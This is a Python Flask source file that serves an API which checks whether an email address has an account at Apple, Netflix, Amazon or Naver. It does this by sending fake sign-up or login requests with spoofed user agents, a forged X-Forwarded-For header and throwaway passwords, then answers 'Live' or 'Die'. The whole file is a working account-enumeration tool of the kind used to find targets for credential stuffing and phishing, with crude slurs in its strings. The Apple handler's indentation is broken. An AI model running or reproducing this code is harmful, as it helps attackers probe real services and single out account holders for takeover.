from flask import Flask, request
import requests
from flask_restful import Resource, Api
from bs4 import BeautifulSoup as Soup
from fake_useragent import UserAgent
from faker import Faker
import re


app = Flask(__name__)
api = Api(app)


class Amazon(Resource):
	def get(self, email):
		link = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
		head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
		s = requests.session()
		g = s.get(link, headers=head)
		while True:
			bacot = email.strip().split(':')
			xxx = {'customerName':'Androsex','email': bacot[0],'emailCheck': bacot[0],'password':'Kontol1337','passwordCheck':'Kontol1337'}
			cek = s.post(link, headers=head, data=xxx).text
			if "You indicated you are a new customer, but an account already exists with the e-mail" in cek:
				return 'Live'
			else:
				return 'Die'

class Naver(Resource):
    def get(self, email):
        try:
            headers = {
                'authority': 'nid.naver.com',
                'accept': '*/*',
                'sec-fetch-dest': 'empty',
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'referer': 'https://nid.naver.com/user2/V2Join.nhn?token_sjoin=Kwavb7ybbQMT01A4&chk_all=on&termsService=on&termsPrivacy=on&termsLocation=Y&termsEmail=Y',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cookie': 'NRTK=ag#all_gr#1_ma#-2_si#0_en#0_sp#0; nid_slevel=1; NNB=PQUK3DLRGGHF4; nid_buk=PQUK3DLRGGHF4',
            }

            params = (
                ('m', 'checkId'),
                ('id', email),
            )

            response = requests.get('https://nid.naver.com/user2/joinAjax.nhn', headers=headers, params=params)
            print (response.text)
            if response.text == 'NNNNN':
                #result={'error':200,'status':'live','msg':email}
                return 'Live'
            elif response.text == 'NNNNY':
                #result={'error':203,'status':'die','msg':email}
                return 'Die'
        except:
            return 'Unknown'



class Netflix(Resource):
    def get(self, email):
        regex = r"^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,})$"
        match = re.match(regex, email)
        if match == None:
            return 'ISI EMAIL JEMBOD', 200
        link = 'https://www.netflix.com/login'
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.netflix.com',
        'Connection': 'keep-alive',
        'Referer': 'https://www.netflix.com/login',
        'Upgrade-Insecure-Requests': '1',
        }

        s = requests.Session()
        g = s.get(link, headers=headers)
        soup=Soup(g.text)
        loginForm = soup.find('form')
        authURL = loginForm.find('input', {'name': 'authURL'}).get('value')
        data = {
        'userLoginId': email,
        'password': 'asdasdasdasd',
        'rememberMe': 'true',
        'flow': 'websiteSignUp',
        'mode': 'login',
        'action': 'loginAction',
        'withFields': 'rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode,recaptchaResponseToken,recaptchaError,recaptchaResponseTime',
        'authURL': authURL,
        'nextPage': '',
        'showPassword': '',
        'countryCode': '+1',
        'countryIsoCode': 'US',
        }
        response = s.post(link, headers=headers, data=data).text
        print(response)
        if 'Please try again or you can' in response:
            return 'Live'
        else:
            return 'Die'



class Apple(Resource):
	def get(self, email):
            faker = Faker()
            ua = UserAgent()
            #email = identifier
            regex = r"^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,})$"
            match = re.match(regex, email)
            if match == None:
                return 'ISI EMAIL JEMBOD', 200
            try:
                header = {
                'X-Forwarded-For': faker.ipv4(network=True, private=True),
                'Connection': 'keep-alive',
                # 'Authority': 'www.apple.com',
                'Cache-Control': 'max-age=0',
                'Origin': 'https://idmsac.apple.com',
                'Upgrade-Insecure-Requests': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': ua.google,
                # 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Referer': 'https://idmsac.apple.com/IDMSWebAuth/login?appIdKey=853f8b2216bcca5abc6f4d08f60dade254556e7e025ce78e22b12ba98e64ece5&rv=1&path=//dsinternal/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                }
                session = requests.Session()
                s = session.get('https://idmsac.apple.com/ssoclassiclogin', headers=header)
                # soup = Soup(s.text)
                # loginFrom = soup.find('from')
                # appIdKey = loginFrom.find('input', {'name': 'appIdKey'}).get('value')
                params = {
                'appleId': email,
                'accountPassword': 'jancok123',
                'appIdKey': '853f8b2216bcca5abc6f4d08f60dade254556e7e025ce78e22b12ba98e64ece5',
                }
                response = session.post('https://idmsac.apple.com/authenticate', headers=header, data=params)
                #print (response)
                if 'Access denied. ' in response.text:
			        return 'Live'
                    return {'error': 200, 'type': 'Apple Prox', 'status': 'live', 'msg': email, 'response': 'Access denied.'}, 200
                elif '503 Service ' in response.text:
			        return 'Error'
                    #return {'error': 503, 'type': 'Apple Prox', 'status': 'error', 'msg': email, 'response': '503 Service'}, 200
                else:
			        return 'Die'
                    #return {'error': 301, 'type': 'Apple Prox', 'status': 'die', 'msg': email, 'response': 'DIE'}, 200
            except:
		        return 'Unknown'
                #return {'error': 404, 'type': 'Apple Prox', 'status': 'die', 'msg': email, 'response': 'NO PROXY'}, 200
            


api.add_resource(Apple, '/Apple/<email>') # Route_3
api.add_resource(Netflix, '/Netflix/<email>') # Route_3
api.add_resource(Amazon, '/Amazon/<email>') # Route_3
api.add_resource(Naver, '/Naver/<email>') # Route_3


if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=True)
